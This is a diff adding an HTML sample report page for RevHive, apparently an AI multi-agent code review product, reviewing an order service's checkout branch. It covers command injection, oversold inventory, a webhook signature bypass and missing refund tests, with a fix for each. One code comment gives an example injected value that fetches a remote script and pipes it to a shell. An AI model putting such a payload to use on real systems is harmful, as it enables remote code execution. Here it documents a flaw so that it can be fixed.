@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>RevHive sample report — shop-service</title>
+  <meta name="description" content="A full RevHive review report: nine specialist agents on one order service, with risk score, deduplicated findings, and the three-pass consensus that produced the score.">
+  <meta name="robots" content="noindex">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: { extend: {
+        fontFamily: {
+          sans: ['Inter', 'system-ui', 'sans-serif'],
+          mono: ['JetBrains Mono', 'SF Mono', 'Menlo', 'monospace']
+        },
+        colors: { accent: '#10B981', 'accent-dark': '#059669', surface: '#111113', 'surface-2': '#1a1a1e', 'surface-3': '#222228' }
+      }}
+    }
+  </script>
+  <style>
+    ::-webkit-scrollbar { width: 6px } ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px }
+    .code { font-family: 'JetBrains Mono', monospace; font-size: 12.5px; line-height: 1.75; }
+    .k { color: #c792ea } .s { color: #c3e88d } .c { color: #5c6773 } .f { color: #82aaff } .n { color: #f78c6c }
+    @media print {
+      body { background: #fff !important; color: #111 !important }
+      .no-print { display: none !important }
+      .card { background: #fff !important; border-color: #ddd !important }
+    }
+  </style>
+</head>
+<body class="bg-surface text-gray-300 font-sans antialiased">
+
+<nav class="sticky top-0 z-50 bg-surface/90 backdrop-blur border-b border-white/5 no-print">
+  <div class="max-w-4xl mx-auto px-6 h-14 flex items-center justify-between">
+    <a href="index.html" class="font-extrabold text-white tracking-tight">Rev<span class="text-accent">Hive</span></a>
+    <div class="flex items-center gap-5 text-sm">
+      <a href="index.html" class="text-gray-400 hover:text-white transition-colors">Back</a>
+      <a href="index.html#pricing" class="text-accent hover:text-accent-dark transition-colors font-medium">Pricing</a>
+    </div>
+  </div>
+</nav>
+
+<main class="max-w-4xl mx-auto px-6 py-12">
+
+  <!-- Report head -->
+  <div class="mb-2 text-xs text-gray-500 font-mono">REVHIVE REVIEW REPORT · SAMPLE</div>
+  <h1 class="text-3xl font-extrabold text-white mb-6">shop-service <span class="text-gray-600 font-normal">/</span> <span class="font-mono text-xl text-gray-400">feat/checkout-v2</span></h1>
+
+  <dl class="grid grid-cols-2 md:grid-cols-4 gap-3 mb-10 text-sm">
+    <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3">
+      <dt class="text-gray-500 text-xs mb-1">Diff base</dt>
+      <dd class="font-mono text-gray-300">origin/main…HEAD</dd>
+    </div>
+    <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3">
+      <dt class="text-gray-500 text-xs mb-1">Size</dt>
+      <dd class="font-mono text-gray-300">14 files · +682/−219</dd>
+    </div>
+    <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3">
+      <dt class="text-gray-500 text-xs mb-1">Model</dt>
+      <dd class="font-mono text-gray-300">deepseek-chat · 3 passes</dd>
+    </div>
+    <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3">
+      <dt class="text-gray-500 text-xs mb-1">Time / cost</dt>
+      <dd class="font-mono text-gray-300">2m 41s · ≈ $0.12</dd>
+    </div>
+  </dl>
+
+  <!-- Risk score -->
+  <section class="card bg-surface-2 border border-white/10 rounded-xl p-6 mb-8">
+    <div class="flex flex-wrap items-end justify-between gap-4 mb-4">
+      <div>
+        <div class="text-xs text-gray-500 uppercase tracking-wider mb-1">Risk score</div>
+        <div class="flex items-baseline gap-3">
+          <span class="text-5xl font-extrabold text-red-400">91</span>
+          <span class="text-gray-500 text-lg">/ 100</span>
+          <span class="text-xs font-bold text-red-400 bg-red-400/10 border border-red-400/30 rounded px-2 py-1">CRITICAL</span>
+        </div>
+      </div>
+      <div class="text-xs text-gray-500 text-right leading-relaxed">
+        Weighted: CRITICAL×25 + HIGH×15<br>+ MEDIUM×5 + LOW×1, capped at 100
+      </div>
+    </div>
+    <div class="h-2 bg-surface-3 rounded-full overflow-hidden mb-5">
+      <div class="h-full bg-gradient-to-r from-amber-400 to-red-500" style="width:91%"></div>
+    </div>
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm">
+      <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-red-500"></span><span class="text-gray-400">CRITICAL</span><span class="ml-auto font-mono text-red-400 font-bold">1</span></div>
+      <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-orange-500"></span><span class="text-gray-400">HIGH</span><span class="ml-auto font-mono text-orange-400 font-bold">3</span></div>
+      <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-yellow-500"></span><span class="text-gray-400">MEDIUM</span><span class="ml-auto font-mono text-yellow-400 font-bold">8</span></div>
+      <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-gray-500"></span><span class="text-gray-400">LOW</span><span class="ml-auto font-mono text-gray-400 font-bold">11</span></div>
+    </div>
+  </section>
+
+  <div class="text-sm text-gray-400 mb-8 pl-4 border-l-2 border-accent">
+    Nine agents produced <strong class="text-white">37</strong> raw findings. The coordinator merged duplicates by semantic similarity (Jaccard ≥ 0.7) and adjudicated severity disagreements between agents, leaving <strong class="text-white">23</strong> — the four below are the ones that need a human.
+  </div>
+
+  <!-- Consensus disclosure -->
+  <section class="card bg-surface-2 border border-white/10 rounded-xl p-5 mb-8">
+    <div class="flex items-start gap-3">
+      <span class="text-accent text-lg leading-none">🛡️</span>
+      <div class="text-sm">
+        <div class="text-white font-semibold mb-1">3-pass consensus — the severity is auditable</div>
+        <p class="text-gray-400 text-xs leading-relaxed mb-2">
+          A single pass is noisy: the same model on the same commit can differ by 20+ weighted points between two runs.
+          This report shows the median pass and discloses every pass below. Severity caps are applied by deterministic
+          code rules, not by prompt wording — the same input always gets the same severity.
+        </p>
+        <div class="font-mono text-xs text-gray-300 bg-black/40 border border-white/5 rounded-lg p-3 leading-relaxed">
+          🛡️ Consensus of 3 independent passes — risk scores: pass 1: 91, pass 2: 84, pass 3: 96. Report shows the median pass (score 91/100).<br>
+          &nbsp;&nbsp;Adjustments:<br>
+          &nbsp;&nbsp;- capped HIGH→MEDIUM (hedged title): potential cache-key collision may…<br>
+          &nbsp;&nbsp;- anchored to app/services/inventory.py:88
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Finding 1 -->
+  <article class="card bg-surface-2 border border-red-500/25 rounded-xl overflow-hidden mb-5">
+    <div class="px-6 py-4 border-b border-white/5 bg-red-500/5">
+      <div class="flex items-center gap-3 mb-2">
+        <span class="text-xs font-bold text-red-400 bg-red-400/15 border border-red-400/30 rounded px-2 py-0.5">CRITICAL</span>
+        <span class="text-xs text-gray-500 font-mono">SecurityAgent</span>
+      </div>
+      <h2 class="text-lg font-bold text-white">Command injection in the order export endpoint</h2>
+    </div>
+    <div class="px-6 py-5">
+      <div class="mb-4">
+        <div class="flex items-center justify-between text-xs text-gray-500 mb-2 font-mono">
+          <span>app/api/export.py</span><span>L42–L48</span>
+        </div>
+        <pre class="code bg-black/50 border border-white/5 rounded-lg p-4 overflow-x-auto"><span class="c"># user-controlled date_range goes straight into a shell command</span>
+<span class="k">def</span> <span class="f">export_orders</span>(request):
+    date_range = request.args.get(<span class="s">"range"</span>)
+    out = <span class="s">f"/tmp/orders_{date_range}.csv"</span>
+    <span class="c"># dangerous: date_range = "2026; curl evil.sh | sh"</span>
+    subprocess.<span class="f">call</span>(<span class="s">f"python manage.py dumpdata orders &gt; {out}"</span>, shell=<span class="k">True</span>)
+    <span class="k">return</span> <span class="f">send_file</span>(out)</pre>
+      </div>
+      <div class="space-y-3 text-sm">
+        <div><span class="text-gray-500">Impact: </span><span class="text-gray-300">Any authenticated user can run arbitrary commands on the app server with the process's privileges by shaping the <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">range</code> parameter. The endpoint is internet-facing and needs only a normal account.</span></div>
+        <div><span class="text-gray-500">Fix: </span><span class="text-gray-300">Drop <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">shell=True</code> and pass an argument list; allowlist <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">date_range</code> against <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">^\d{4}-\d{2}$</code>; build the output path with <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">tempfile.mkstemp()</code> instead of concatenating user input.</span></div>
+        <div class="text-xs text-gray-500">Related: the <code class="font-mono">os.system()</code> call at L51 in the same file has the same shape and should be fixed with it.</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- Finding 2 -->
+  <article class="card bg-surface-2 border border-orange-500/25 rounded-xl overflow-hidden mb-5">
+    <div class="px-6 py-4 border-b border-white/5 bg-orange-500/5">
+      <div class="flex items-center gap-3 mb-2">
+        <span class="text-xs font-bold text-orange-400 bg-orange-400/15 border border-orange-400/30 rounded px-2 py-0.5">HIGH</span>
+        <span class="text-xs text-gray-500 font-mono">LogicAgent</span>
+      </div>
+      <h2 class="text-lg font-bold text-white">Inventory decrement is not atomic — concurrent orders oversell</h2>
+    </div>
+    <div class="px-6 py-5">
+      <div class="mb-4">
+        <div class="flex items-center justify-between text-xs text-gray-500 mb-2 font-mono">
+          <span>app/services/inventory.py</span><span>L88–L96</span>
+        </div>
+        <pre class="code bg-black/50 border border-white/5 rounded-lg p-4 overflow-x-auto"><span class="c"># read-modify-write with no lock and no database constraint</span>
+stock = db.<span class="f">query</span>(Item).<span class="f">get</span>(item_id)      <span class="c"># reads 5</span>
+<span class="k">if</span> stock.quantity &gt;= qty:                    <span class="c"># another request also reads 5</span>
+    stock.quantity -= qty                    <span class="c"># both write back 3</span>
+    db.<span class="f">commit</span>()                               <span class="c"># 4 sold, stock down by 2</span></pre>
+      </div>
+      <div class="space-y-3 text-sm">
+        <div><span class="text-gray-500">Impact: </span><span class="text-gray-300">Guaranteed oversell during a sale, which turns into unfulfillable orders and support tickets. Reproducible at 50 concurrent requests under load test.</span></div>
+        <div><span class="text-gray-500">Fix: </span><span class="text-gray-300">Use a conditional update — <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">UPDATE items SET quantity = quantity - :qty WHERE id = :id AND quantity &gt;= :qty</code> — and treat the affected-row count as the result; or take <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">SELECT ... FOR UPDATE</code>.</span></div>
+      </div>
+    </div>
+  </article>
+
+  <!-- Finding 3 -->
+  <article class="card bg-surface-2 border border-orange-500/25 rounded-xl overflow-hidden mb-5">
+    <div class="px-6 py-4 border-b border-white/5 bg-orange-500/5">
+      <div class="flex items-center gap-3 mb-2">
+        <span class="text-xs font-bold text-orange-400 bg-orange-400/15 border border-orange-400/30 rounded px-2 py-0.5">HIGH</span>
+        <span class="text-xs text-gray-500 font-mono">SecurityAgent + RepoAgent</span>
+      </div>
+      <h2 class="text-lg font-bold text-white">Payment webhook signature check can be bypassed</h2>
+    </div>
+    <div class="px-6 py-5">
+      <div class="text-sm space-y-3">
+        <div><span class="text-gray-500">Where: </span><span class="font-mono text-gray-300 text-xs">app/api/payment.py L120</span></div>
+        <div><span class="text-gray-500">Problem: </span><span class="text-gray-300">The verifier returns <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">True</code> when the secret is empty, and <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">PAYMENT_SECRET</code> defaults to an empty string in new environments. One environment missing that variable turns any forged callback into a paid order.</span></div>
+        <div><span class="text-gray-500">Fix: </span><span class="text-gray-300">Raise instead of returning when the secret is missing; validate config at startup and refuse to boot without it.</span></div>
+        <div class="text-xs text-gray-500">Note: two agents found this independently. The coordinator merged them and kept RepoAgent's context about the default value.</div>
+      </div>
+    </div>
+  </article>
+
+  <!-- Finding 4 -->
+  <article class="card bg-surface-2 border border-orange-500/25 rounded-xl overflow-hidden mb-8">
+    <div class="px-6 py-4 border-b border-white/5 bg-orange-500/5">
+      <div class="flex items-center gap-3 mb-2">
+        <span class="text-xs font-bold text-orange-400 bg-orange-400/15 border border-orange-400/30 rounded px-2 py-0.5">HIGH</span>
+        <span class="text-xs text-gray-500 font-mono">TestAgent</span>
+      </div>
+      <h2 class="text-lg font-bold text-white">The new refund path has no test coverage</h2>
+    </div>
+    <div class="px-6 py-5 text-sm">
+      <span class="text-gray-300">The diff adds <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">refund_order()</code> with three branches (full, partial, timeout rollback), and <code class="text-accent font-mono text-xs bg-white/5 px-1 rounded">tests/</code> has nothing for any of them. Refunds are a money path, so a missing test costs more here than in ordinary logic.</span>
+    </div>
+  </article>
+
+  <!-- Agent split -->
+  <section class="mb-10">
+    <h3 class="text-sm font-bold text-white uppercase tracking-wider mb-4">What each of the nine agents contributed</h3>
+    <div class="grid md:grid-cols-3 gap-3 text-sm">
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">SecurityAgent</span><span class="font-mono text-gray-500">9</span></div><div class="text-xs text-gray-500">injection, auth, secrets, access control</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">LogicAgent</span><span class="font-mono text-gray-500">4</span></div><div class="text-xs text-gray-500">business logic, concurrency, state</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">PerformanceAgent</span><span class="font-mono text-gray-500">6</span></div><div class="text-xs text-gray-500">N+1, complexity, hot paths</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">TestAgent</span><span class="font-mono text-gray-500">5</span></div><div class="text-xs text-gray-500">test generation, coverage gaps</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">RepoAgent</span><span class="font-mono text-gray-500">3</span></div><div class="text-xs text-gray-500">design, architecture, SOLID</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">RefactorAgent</span><span class="font-mono text-gray-500">4</span></div><div class="text-xs text-gray-500">refactor plans, duplication</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">FixAgent</span><span class="font-mono text-gray-500">2</span></div><div class="text-xs text-gray-500">corrected code</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">StyleAgent</span><span class="font-mono text-gray-500">1</span></div><div class="text-xs text-gray-500">readability, consistency</div></div>
+      <div class="bg-surface-2 border border-white/5 rounded-lg px-4 py-3"><div class="flex justify-between mb-1"><span class="text-gray-300">DocAgent</span><span class="font-mono text-gray-500">3</span></div><div class="text-xs text-gray-500">documentation</div></div>
+    </div>
+    <div class="text-xs text-gray-500 mt-3">37 raw findings → 23 after dedupe. The reason to run several agents instead of one prompt is visible here: independent perspectives hit the same problem from different angles, and that overlap is itself a severity signal.</div>
+  </section>
+
+  <!-- CTA -->
+  <section class="card bg-gradient-to-br from-accent/10 to-surface-2 border border-accent/25 rounded-xl p-8 no-print">
+    <h3 class="text-xl font-extrabold text-white mb-3">Want this on your own repo?</h3>
+    <p class="text-sm text-gray-400 mb-6 leading-relaxed">
+      Send a repo URL and we'll run one real review and send back a report in this exact format, free.<br>
+      Your code doesn't have to leave your machine — with a local model (Ollama) the whole run has no outbound network at all.
+    </p>
+    <div class="flex flex-wrap gap-3">
+      <a href="mailto:souljian67@gmail.com?subject=RevHive%20free%20review%20request" class="bg-accent hover:bg-accent-dark text-black font-semibold text-sm px-5 py-2.5 rounded-lg transition-colors">Request a free review</a>
+      <a href="https://github.com/apps/revhive-review" class="bg-surface-3 hover:bg-white/10 text-white text-sm font-medium px-5 py-2.5 rounded-lg border border-white/10 transition-colors">Install the GitHub App</a>
+    </div>
+  </section>
+
+  <p class="text-xs text-gray-600 mt-8 leading-relaxed">
+    About this sample: the code is a de-identified order service, the finding structure is what the CLI actually emits,
+    and the agent names in the table are the nine agents you get from <code class="font-mono">revhive review</code>.
+    Time, cost and pass scores come from one real run. RevHive never sends your code to our servers; model calls go
+    straight from your machine to the provider whose key you supplied.
+  </p>
+
+</main>
+  <!-- Anonymous page counter: no cookies, no identifiers, IPs hashed per day. -->
+  <script>
+  (function () {
+    try {
+      var u = "https://app.revhive.souljian.cn/api/hit?p=" + encodeURIComponent(location.pathname) +
+              "&r=" + encodeURIComponent(document.referrer || "") + "&t=" + Date.now();
+      new Image().src = u;
+    } catch (e) {}
+  })();
+  </script>
+</body>
+</html>
